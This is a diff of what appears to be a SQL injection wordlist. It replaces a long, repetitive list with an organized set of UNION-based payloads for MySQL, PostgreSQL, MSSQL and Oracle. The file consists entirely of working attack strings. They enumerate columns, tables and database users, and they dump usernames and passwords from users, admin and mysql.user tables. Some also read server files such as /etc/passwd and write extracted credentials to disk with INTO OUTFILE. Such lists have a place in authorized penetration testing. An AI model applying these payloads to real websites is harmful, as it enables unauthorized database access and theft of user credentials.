@@ -1,320 +1,170 @@
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
+﻿# ================================================
+# UNION-BASED SQL INJECTION PAYLOADS
+# Comprehensive collection for data extraction
+# ================================================
+
+# Column enumeration - 1 column
+' UNION SELECT null--
+' UNION SELECT 1--
+' UNION SELECT 'a'--
+
+# Column enumeration - 2 columns
+' UNION SELECT null,null--
+' UNION SELECT 1,2--
+' UNION SELECT 'a','b'--
+
+# Column enumeration - 3 columns
+' UNION SELECT null,null,null--
 ' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
+' UNION SELECT 'a','b','c'--
+
+# Column enumeration - 4 columns
+' UNION SELECT null,null,null,null--
+' UNION SELECT 1,2,3,4--
+
+# Column enumeration - 5 columns
+' UNION SELECT null,null,null,null,null--
+' UNION SELECT 1,2,3,4,5--
+
+# Column enumeration - 6 columns
+' UNION SELECT 1,2,3,4,5,6--
+
+# Version extraction - MySQL/MariaDB
+' UNION SELECT @@version--
+' UNION SELECT null,@@version--
+' UNION SELECT 1,@@version--
+' UNION SELECT @@version,@@version_comment--
+' UNION SELECT version(),database()--
+
+# Version extraction - PostgreSQL
+' UNION SELECT version()--
+' UNION SELECT null,version()--
+
+# Version extraction - MSSQL
+' UNION SELECT @@version--
+' UNION SELECT SERVERPROPERTY('productversion')--
+
+# Database name extraction
+' UNION SELECT database()--
+' UNION SELECT null,database()--
+' UNION SELECT 1,database()--
+' UNION SELECT db_name()--
+' UNION SELECT schema_name()--
+
+# User extraction
+' UNION SELECT user()--
+' UNION SELECT null,user()--
+' UNION SELECT current_user--
+' UNION SELECT null,current_user--
+' UNION SELECT user_name()--
+' UNION SELECT system_user--
+
+# Table enumeration
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT null,table_name FROM information_schema.tables--
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=database()--
+
+# Column enumeration
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT null,column_name FROM information_schema.columns--
+' UNION SELECT table_name,column_name FROM information_schema.columns--
 ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
+' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
+
+# Data extraction - Users table
+' UNION SELECT username,password FROM users--
+' UNION SELECT null,username,password FROM users--
+' UNION SELECT id,username,password FROM users--
+' UNION SELECT username,password,email FROM users--
+' UNION SELECT concat(username,':',password) FROM users--
+' UNION SELECT null,concat(username,':',password) FROM users--
+' UNION SELECT group_concat(username,':',password) FROM users--
+
+# Data extraction - Admin table
+' UNION SELECT username,password FROM admin--
+' UNION SELECT null,username,password FROM admin--
+' UNION SELECT user,pass FROM admin--
+
+# Data extraction - Members table
+' UNION SELECT username,password FROM members--
+' UNION SELECT user_name,user_pass FROM members--
+
+# Data extraction - MySQL user table
+' UNION SELECT user,password FROM mysql.user--
+' UNION SELECT null,concat(user,':',password) FROM mysql.user--
+' UNION SELECT host,user,password FROM mysql.user--
+
+# Alternative comment styles
+' UNION SELECT 1#
+' UNION SELECT 1,2#
+' UNION SELECT 1,2,3#
+' UNION SELECT 1,2,3,4#
+' UNION SELECT null/*
+' UNION SELECT 1/*
+' UNION SELECT 1,2/*
+
+# Double quote variations
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+" UNION SELECT 1,2,3--
+" UNION SELECT database(),version()--
+
+# Parenthesis closing variations
+') UNION SELECT 1--
+') UNION SELECT 1,2--
+') UNION SELECT 1,2,3--
+')) UNION SELECT 1,2--
+')) UNION SELECT 1,2,3--
+
+# UNION ALL variations
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT null,username,password FROM users--
+
+# Oracle specific (with FROM dual)
+' UNION SELECT 1 FROM dual--
+' UNION SELECT 1,2 FROM dual--
 ' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
+' UNION SELECT user FROM dual--
+' UNION SELECT null,user FROM dual--
+
+# File reading (MySQL)
+' UNION SELECT load_file('/etc/passwd')--
+' UNION SELECT null,load_file('/etc/passwd')--
+' UNION SELECT 1,load_file('c:/windows/system32/drivers/etc/hosts')--
+
+# Into outfile (MySQL)
+' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'--
+' UNION SELECT username,password,email FROM users INTO OUTFILE '/tmp/users.txt'--
+
+# Complex extractions
+' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
 ' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
+' UNION SELECT 1,2,concat(username,0x3a,password) FROM users--
+' UNION SELECT null,concat(table_schema,0x3a,table_name) FROM information_schema.tables--
+
+# WHERE clause tests
 ' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
-' UNION SELECT null, null--
-' UNION SELECT username, password FROM users--
-' UNION SELECT 1,2,3--
-' UNION SELECT database(), version()--
-' UNION SELECT 1, database()--
-' UNION SELECT user(), version()--
-' UNION SELECT null, table_name FROM information_schema.tables--
-' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT username, password FROM members--
-' UNION SELECT null, null, null--
-' UNION SELECT 1,2,3 FROM dual--
-' UNION ALL SELECT null, username, password FROM admin--
-' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--
-' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,2,3 WHERE 1=1--
+' UNION SELECT 1,2,3 WHERE 1=2--
+' UNION SELECT database(),user() WHERE 'a'='a'--
+
+# Limit variations (MySQL)
+' UNION SELECT 1,2,3 LIMIT 1--
+' UNION SELECT 1,2,3 LIMIT 1,1--
+' UNION SELECT username,password FROM users LIMIT 1--
+' UNION SELECT username,password FROM users LIMIT 0,1--
+
+# Order by tests
+' UNION SELECT 1,2,3 ORDER BY 1--
+' UNION SELECT 1,2,3 ORDER BY 2--
+' UNION SELECT username,password FROM users ORDER BY username--
+
+# Advanced data concatenation
+' UNION SELECT 1,2,concat_ws(',',username,password,email) FROM users--
+' UNION SELECT 1,2,concat(username,'|',password,'|',email) FROM users--
+' UNION SELECT null,concat(0x3c,username,0x3e) FROM users--
